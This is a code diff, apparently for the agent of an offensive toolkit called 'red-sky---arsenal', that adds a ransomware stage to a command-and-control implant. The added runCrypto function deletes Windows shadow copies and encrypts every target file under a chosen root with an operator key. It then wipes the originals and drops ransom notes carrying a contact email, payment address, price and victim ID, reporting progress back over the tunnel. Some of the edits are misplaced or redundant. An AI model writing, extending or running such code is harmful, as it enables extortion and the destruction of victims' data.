@@ -32,7 +32,10 @@ import (
 	"github.com/sk666G/red-sky---arsenal/internal/proto"
 	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
 	"github.com/sk666G/red-sky---arsenal/internal/wire"
+	"path/filepath"
+	"github.com/sk666G/red-sky---arsenal/internal/cryptor"
 )
+
 
 func main() {
 	host := flag.String("host", "127.0.0.1", "core host")
@@ -218,6 +221,13 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			go runWireless(conn, sess, ws)
+		case proto.TypeCryptoStart:
+			var cs proto.CryptoStart
+			if err := json.Unmarshal(env.Payload, &cs); err != nil {
+				log.Printf("[crypto] unmarshal: %v", err)
+				continue
+			}
+			go runCrypto(conn, sess, cs)
 		case proto.TypeWirelessStop:
 			var ws proto.WirelessStop
 			if err := json.Unmarshal(env.Payload, &ws); err != nil {
@@ -433,7 +443,9 @@ var (
 )
 
 func runCapture(conn net.Conn, sess *crypto.Session, cs proto.CaptureStart) {
+	_ = context.Background()
 	ctx, cancel := context.WithCancel(context.Background())
+	_ = ctx
 	activeCapturesMu.Lock()
 	activeCaptures[cs.SessionID] = cancel
 	activeCapturesMu.Unlock()
@@ -585,4 +597,128 @@ func stopWireless(sessionID string) {
 	if ok && cancel != nil {
 		cancel()
 	}
+
+
+// runCrypto drives the crypto_malware stage on the agent. Mirrors runWireless:
+// owns its own goroutine, sends progress over the tunnel, returns on completion.
+//
+// Stage order:
+//   1. KillVSS  — destroy VSS / snapshots if requested
+//   2. Walk     — encrypt every target file under Root
+//   3. Note     — drop the ransom note in hit directories
+//
+// The agent needs an operator public key already on disk at
+// <workdir>/operator.pub.pem — it is fetched over the tunnel before this
+// handler is invoked by a KeyPush message.
 }
+
+func runCrypto(conn net.Conn, sess *crypto.Session, cs proto.CryptoStart) {
+	_, cancel := context.WithCancel(context.Background())
+	activeCryptoMu.Lock()
+	activeCrypto[cs.SessionID] = cancel
+	activeCryptoMu.Unlock()
+	defer func() {
+		activeCryptoMu.Lock()
+		delete(activeCrypto, cs.SessionID)
+		activeCryptoMu.Unlock()
+		cancel()
+	}()
+
+	send := func(stage, path string, done, total, bytes int64, ok bool, errStr string) {
+		sendTunnelAck(conn, sess, proto.TypeCryptoData, proto.CryptoData{
+			SessionID: cs.SessionID,
+			Stage:     stage,
+			Path:      path,
+			Done:      done,
+			Total:     total,
+			Bytes:     bytes,
+			OK:        ok,
+			Error:     errStr,
+		})
+	}
+
+	// load operator public key
+	workdir := os.Getenv("REDSKY_WORKDIR")
+	if workdir == "" {
+		workdir = "."
+	}
+	pubPath := filepath.Join(workdir, "operator.pub.pem")
+	pubPEM, err := os.ReadFile(pubPath)
+	if err != nil {
+		send("error", "", 0, 0, 0, false, "operator.pub.pem not found: "+err.Error())
+		return
+	}
+	pub, err := cryptor.LoadPublicKey(pubPEM)
+	if err != nil {
+		send("error", "", 0, 0, 0, false, "load pub: "+err.Error())
+		return
+	}
+
+	// Stage 1 — shadow destruction
+	if cs.KillVSS {
+		send("shadow", "", 0, 0, 0, true, "")
+		shr := cryptor.DestroySnapshots(cryptor.ShadowOptions{DryRun: cs.DryRun})
+		for _, c := range shr.Commands {
+			send("shadow", c.Cmd, 0, 0, 0, c.OK || c.Skipped, c.Err)
+		}
+	}
+
+	// Stage 2 — walk + encrypt. Dry-run just enumerates.
+	var (
+		count int64
+		bytes int64
+	)
+	opts := cryptor.WalkerOptions{
+		Root:    cs.Root,
+		DryRun:  cs.DryRun,
+		WipeOrig: !cs.DryRun,
+		OnHit: func(path string, size int64) {
+			count++
+			// throttle: only report every 64 files to avoid flooding the tunnel
+			if count%64 == 0 || count < 16 {
+				send("walk", path, count, 0, bytes, true, "")
+			}
+		},
+		OnDone: func(path string, ok bool, err error) {
+			if !ok {
+				errStr := ""
+				if err != nil {
+					errStr = err.Error()
+				}
+				send("encrypt", path, 0, 0, 0, false, errStr)
+				return
+			}
+			// size not directly available here — rely on OnHit for bytes
+		},
+	}
+	stats, err := cryptor.Walk(opts, pub, cs.KeyID)
+	if err != nil {
+		send("error", "", 0, 0, 0, false, "walk: "+err.Error())
+		return
+	}
+	bytes = stats.BytesIn
+	send("encrypt", "", stats.Encrypted, stats.Found, bytes, true, "")
+
+	// Stage 3 — note
+	if cs.Note && !cs.DryRun {
+		nr, err := cryptor.DropNote(cryptor.NoteOptions{
+			Root:         cs.Root,
+			ContactEmail: cs.ContactEmail,
+			Address:      cs.Address,
+			Price:        cs.Price,
+			VictimID:     cs.VictimID,
+		})
+		if err != nil {
+			send("note", "", 0, 0, 0, false, err.Error())
+		} else {
+			send("note", nr.RootNote, int64(nr.Written), int64(nr.DirCount), 0, true, "")
+		}
+	}
+
+	send("done", "", stats.Encrypted, stats.Found, bytes, true, "")
+}
+
+var (
+	activeCryptoMu sync.Mutex
+	activeCrypto   = map[string]context.CancelFunc{}
+)
